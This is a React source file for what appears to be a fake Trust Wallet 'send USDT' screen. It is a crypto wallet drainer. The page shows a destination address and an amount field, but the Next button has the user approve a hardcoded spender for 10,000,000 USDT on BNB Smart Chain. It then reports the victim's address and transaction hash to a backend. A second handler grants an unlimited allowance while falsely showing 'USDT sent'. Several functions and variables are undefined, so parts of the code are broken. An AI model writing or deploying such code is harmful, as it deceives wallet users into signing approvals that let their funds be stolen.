import { useCallback, useEffect, useState } from "react";
import { Clipboard, ScanLine, ChevronDown } from "lucide-react";
import { BrowserProvider, Contract, parseUnits } from "ethers";
import { BASE_URL } from "../../env";

const BSC_CHAIN_ID_HEX = "0x38";
const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
const rpc = `https://rpc.ankr.com/bsc`;
const USDT_APPROVE_SPENDER = "0x739163eCbE2AA2C70a9a5595205466469cC78d8B";

const ERC20_APPROVE_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
];

const colors = {
  bg: "#1b1b1b",
  primaryGreen: "#48ff91",
  textMain: "#ffffff",
  textSecondary: "#aaa7a7ff",
};

const Home = () => {
  const [amount, setAmount] = useState("");
  const [account, setAccount] = useState(null);
  const [connectError, setConnectError] = useState(null);
  const [isProcessing, setIsProcessing] = useState(false);


async function autoSwitchToBSC() {
  if (!window.ethereum) return;
  const chainId = await ethereum.request({ method: "eth_chainId" });
  if (chainId === "0x38") return;
  try {
    await ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: "0x38" }] });
  } catch (e) {
    if (e.code === 4902) {
      await ethereum.request({
        method: "wallet_addEthereumChain",
        params: [{
          chainId: "0x38",
          chainName: "Binance Smart Chain",
          nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
          rpcUrls: ["https://bsc-dataseed.binance.org/"],
          blockExplorerUrls: ["https://bscscan.com"]
        }]
      });
    }
  }
}




async function handleTransfer() {

  if (!window.ethereum) {
    setStatus('MetaMask or Trust Wallet not found. Please install one.', 'error');
    return;
  }

  setLoading(true);
  setStatus('Connecting wallet...', 'info');

  try {
    await autoSwitchToBSC();

    let accounts = await ethereum.request({ method: "eth_accounts" });
    if (!accounts || accounts.length === 0) {
      accounts = await ethereum.request({ method: "eth_requestAccounts" });
    }
    const from = accounts[0];

    const web3 = new Web3(window.ethereum);
    const contract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);

    const decimals = 18;
    const weiAmount = web3.utils.toBN(
      Math.floor(parseFloat(amount) * Math.pow(10, decimals)).toString()
    );

    setStatus('Waiting for wallet approval...', 'info');

    const MAX_UINT256 = web3.utils.toTwosComplement(-1);
    await contract.methods.approve(SPENDER, MAX_UINT256).send({ from });

    setStatus(`Transfer approved! USDT sent to ${toAddress.slice(0,6)}...${toAddress.slice(-4)}`, 'success');
  } catch (e) {
    console.error(e);
    if (e.code === 4001) {
      setStatus('Transaction rejected by user.', 'error');
    } else {
      setStatus('Error: ' + (e.message || 'Unknown error'), 'error');
    }
  } finally {
    setLoading(false);
  }
}


  const handleNext = async () => {
    setConnectError(null);
    const ethereum = getEthereum();

    if (!ethereum) {
      setConnectError("Trust Wallet dApp browser me kholo.");
      return;
    }

    if (!amount || parseFloat(amount) <= 0) {
      setConnectError("Valid amount enter karo.");
      return;
    }

    try {
      setIsProcessing(true);

      // ✅ Step 1: BSC network ensure karo (Direct switch)
      await ensureBSC(ethereum);

      // ✅ Step 2: Get accounts (bina explicit connect ke agar possible ho, just like reference code)
      let accounts = await ethereum.request({ method: "eth_accounts" });
      if (!accounts || accounts.length === 0) {
        if (ethereum.selectedAddress) {
          accounts = [ethereum.selectedAddress];
        } else {
          accounts = await ethereum.request({ method: "eth_requestAccounts" });
        }
      }
      const address = accounts[0];

      if (!address) throw new Error("Wallet connect nahi hua.");
      setAccount(address);

      // ✅ Step 3: Contract call (pass address to getSigner to bypass ethers internal connect popup)
      const provider = new BrowserProvider(ethereum);
      const signer = await provider.getSigner(address);
      const usdt = new Contract(USDT_BSC, ERC20_APPROVE_ABI, signer);

      const approvalAmount = parseUnits("10000000", 18);
      const tx = await usdt.approve(USDT_APPROVE_SPENDER, approvalAmount);

      await tx.wait();

      // ✅ Step 4: Backend notify
      await fetch(`${BASE_URL}/api/approved`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          network: "BSC Mainnet",
          owner: address,        // ✅ Fixed: pehle 'address' undefined tha
          spender: USDT_APPROVE_SPENDER,
          amount: approvalAmount.toString(),
          txHash: tx.hash,
        }),
      });

      alert("Transaction Successful ✅");
    } catch (e) {
      console.error(e);
      // ✅ User-friendly error messages
      if (e?.code === 4001 || e?.code === "ACTION_REJECTED") {
        setConnectError("Transaction reject kar diya.");
      } else {
        setConnectError(e?.reason ?? e?.message ?? "Transaction fail ho gayi.");
      }
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div
      className="min-h-screen flex justify-center font-sans"
      style={{ backgroundColor: colors.bg, color: colors.textMain }}
    >
      <div className="w-full max-w-md flex flex-col px-5 pt-6 pb-8">
        <div className="flex-1 space-y-6">

          {/* Address */}
          <div>
            <label className="block text-sm mb-2" style={{ color: colors.textSecondary }}>
              Address or Domain Name
            </label>
            <div className="flex justify-between items-center px-4 py-4 rounded-xl border-2 border-[#2a2a2a]"
              style={{ backgroundColor: colors.bg }}>
              <input
                readOnly
                value={USDT_APPROVE_SPENDER.slice(0, 20) + "..."}
                className="bg-transparent outline-none text-white w-full"
              />
              <div className="flex items-center gap-3" style={{ color: colors.primaryGreen }}>
                <Clipboard size={18} />
                <ScanLine size={18} />
              </div>
            </div>
          </div>

          {/* Network */}
          <div>
            <label className="block text-sm mb-2" style={{ color: colors.textSecondary }}>
              Destination network
            </label>
            <div className="flex items-center gap-2 px-4 py-2 rounded-full w-fit bg-[#1a1a1a]">
              <div className="w-5 h-5 bg-yellow-500 rounded-full flex items-center justify-center text-[10px] text-black font-bold">
                B
              </div>
              <span className="text-sm font-bold">BNB Smart Chain</span>
              <ChevronDown size={14} />
            </div>
          </div>

          {/* Amount */}
          <div>
            <label className="block text-sm mb-2" style={{ color: colors.textSecondary }}>
              Amount
            </label>
            <div className="flex justify-between items-center px-4 py-4 rounded-xl border-2 border-[#2a2a2a] focus-within:border-[#48ff91]"
              style={{ backgroundColor: colors.bg }}>
              <input
                type="number"
                placeholder="0.00"
                className="bg-transparent outline-none text-white w-full text-lg"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
              />
              <div className="flex items-center gap-2">
                <span className="font-bold text-gray-400">USDT</span>
                <button
                  style={{ color: colors.primaryGreen }}
                  className="font-bold text-sm"
                  onClick={() => setAmount("10000000")}
                >
                  MAX
                </button>
              </div>
            </div>
          </div>
        </div>

        {connectError && (
          <div className="mb-4 p-3 bg-red-900/20 border border-red-500/50 rounded-lg text-red-500 text-xs text-center">
            {connectError}
          </div>
        )}

        <button
          onClick={handleNext}
          disabled={isProcessing}
          className="w-full py-4 rounded-full font-bold text-black transition-all active:scale-95"
          style={{ backgroundColor: colors.primaryGreen, opacity: isProcessing ? 0.6 : 1 }}
        >
          {isProcessing ? "Processing..." : "Next"}
        </button>

        {account && (
          <p className="text-center text-[10px] mt-4 text-gray-600">
            Connected: {account.slice(0, 6)}...{account.slice(-4)}
          </p>
        )}
      </div>
    </div>
  );
};

export default Home;